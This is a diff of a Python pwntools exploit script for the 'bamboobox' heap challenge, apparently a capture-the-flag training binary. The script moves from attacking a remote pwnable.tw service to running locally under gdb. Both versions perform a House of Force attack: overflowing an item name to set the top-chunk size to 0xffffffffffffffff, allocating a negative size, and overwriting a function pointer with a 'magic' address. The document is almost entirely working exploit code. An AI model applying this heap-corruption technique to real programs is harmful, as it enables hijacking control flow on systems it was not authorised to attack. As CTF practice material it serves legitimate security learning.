@@ -1,44 +1,40 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
-from pwnpwnpwn import *
 from pwn import *
 
-host = "training.pwnable.tw"
-port = 11011
-
-r = remote(host,port)
-
-def additem(length,name):
-    r.recvuntil(":")
-    r.sendline("2")
-    r.recvuntil(":")
-    r.sendline(str(length))
-    r.recvuntil(":")
-    r.sendline(name)
-
-def modify(idx,length,name):
-    r.recvuntil(":")
-    r.sendline("3")
-    r.recvuntil(":")
-    r.sendline(str(idx))
-    r.recvuntil(":")
-    r.sendline(str(length))
-    r.recvuntil(":")
-    r.sendline(name)
-
-def remove(idx):
-    r.recvuntil(":")
-    r.sendline("4")
-    r.recvuntil(":")
-    r.sendline(str(idx))
-
-def show():
-    r.recvuntil(":")
-    r.sendline("1")
+io = process('./bamboobox')
+context.log_level = 'debug'
 
 magic = 0x400d49
-additem(0x60,"ddaa")
-modify(0,0x70,"a"*0x60 + p64(0) + p64(0xffffffffffffffff))
-additem(-160,"dada")
-additem(0x20,p64(magic)*2)
-r.interactive()
+
+def show():
+    io.sendlineafter("Your choice:",'1')
+
+def add(length,name):
+    io.sendlineafter("Your choice:",'2')
+    io.sendlineafter("Please enter the length of item name:",str(length))
+    io.sendlineafter("Please enter the name of item:",name)
+
+def change(idx,length,name):
+    io.sendlineafter("Your choice:",'3')
+    io.sendlineafter("Please enter the index of item:",str(idx))
+    io.sendlineafter("Please enter the length of item name:",str(length))
+    io.sendlineafter("Please enter the new name of the item:",name)
+
+def remove(idx):
+    io.sendlineafter("Your choice:",'4')
+    io.sendlineafter("Please enter the index of item:",str(idx))
+
+def exit():
+    io.sendlineafter("Your choice:",'5')
+
+add(0x30,'aaaa')
+payload = 'a'*0x30 + p64(0) + p64(0xffffffffffffffff)
+change(0,len(payload),payload)
+
+add(-0x70,'aaaa')
+add(0x10,p64(0)+p64(magic))
+gdb.attach(io)
+exit()
+
+io.interactive()
